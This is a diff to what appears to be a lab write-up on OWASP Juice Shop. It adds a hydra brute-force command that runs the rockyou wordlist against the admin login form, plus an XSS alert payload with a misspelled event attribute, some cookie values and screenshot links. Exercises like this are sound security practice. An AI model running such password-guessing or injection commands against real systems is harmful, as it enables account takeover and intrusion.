@@ -3,5 +3,18 @@
 
 
 
-(hydra -l admin@juice-sh.op -P  /usr/share/wordlists/rockyou.txt juice-shop.herokuapp.com httppost-form  
+2-(hydra -l admin@juice-sh.op -P  /usr/share/wordlists/rockyou.txt juice-shop.herokuapp.com httppost-form  
 "/rest/user/login:email=^USER^&password=^PASS^:F=Invalid email or password" -V -I -F 
+
+
+![image](https://github.com/user-attachments/assets/61580b47-9d74-4394-80ea-ac97513c2b9a)
+
+
+3-	<a href=”#”  oneclick=”alert(‘XSS’)”> OFFERS!!! </a>
+![image](https://github.com/user-attachments/assets/3bd63a29-c1a5-4edf-b64b-1f12cad7397b)
+
+4-The cookie: 
+(language=en;welcomebanner_status=dismiss;cookieconsent_st atus=dismiss) 
+![image](https://github.com/user-attachments/assets/9eba5710-81ae-45e5-99b4-eeb9b052e58f)
+
+
